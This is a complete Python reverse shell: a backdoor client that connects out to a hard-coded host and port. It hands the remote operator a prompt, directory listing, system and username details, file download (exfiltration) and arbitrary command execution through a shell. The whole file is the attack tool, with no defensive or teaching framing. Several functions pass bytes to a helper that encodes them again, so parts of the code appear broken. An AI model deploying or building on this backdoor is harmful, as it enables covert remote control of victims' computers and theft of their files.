import socket
import subprocess
import os
import platform
import getpass
import colorama
from colorama import Fore, Style
from time import sleep

colorama.init()

RHOST = "127.0.0.1"
RPORT = 2222

def send_data(sock, data):
    sock.send(data.encode())

def receive_data(sock, bufsize=1024):
    return sock.recv(bufsize).decode("utf-8")

def list_files():
    return str(os.listdir(".")).encode()

def change_directory(cmd):
    directory = cmd.split(" ")[1]
    os.chdir(directory)
    return f"Changed directory to {os.getcwd()}".encode()

def get_system_info():
    sysinfo = f"""
Operating System: {platform.system()}
Computer Name: {platform.node()}
Username: {getpass.getuser()}
Release Version: {platform.release()}
Processor Architecture: {platform.processor()}
    """
    return sysinfo.encode()

def download_file(sock, cmd):
    filename = cmd.split(" ")[1]
    with open(filename, "rb") as f:
        file_data = f.read(1024)
        while file_data:
            send_data(sock, file_data)
            file_data = f.read(1024)
        sleep(2)
        send_data(sock, b"DONE")
    print("Finished sending data")

def execute_command(cmd):
    comm = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    STDOUT, STDERR = comm.communicate()
    if not STDOUT:
        return STDERR
    else:
        return STDOUT

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((RHOST, RPORT))

    while True:
        try:
            header = f"{Fore.RED}{getpass.getuser()}@{platform.node()}{Style.RESET_ALL}:{Fore.LIGHTBLUE_EX}{os.getcwd()}{Style.RESET_ALL}$ "
            send_data(sock, header)
            cmd = receive_data(sock)

            # List files in the dir
            if cmd == "list":
                send_data(sock, list_files())

            # Change directory
            elif cmd.startswith("cd"):
                send_data(sock, change_directory(cmd))

            # Get system info
            elif cmd == "sysinfo":
                send_data(sock, get_system_info())

            # Download files
            elif cmd.startswith("download"):
                download_file(sock, cmd)

            # Terminate the connection
            elif cmd == "exit":
                send_data(sock, b"exit")
                break

            # Run any other command
            else:
                output = execute_command(cmd)
                send_data(sock, output)

            # If the connection terminates
            if not cmd:
                print("Connection dropped")
                break
        except Exception as e:
            send_data(sock, f"An error has occurred: {str(e)}")

    sock.close()

if __name__ == "__main__":
    main()
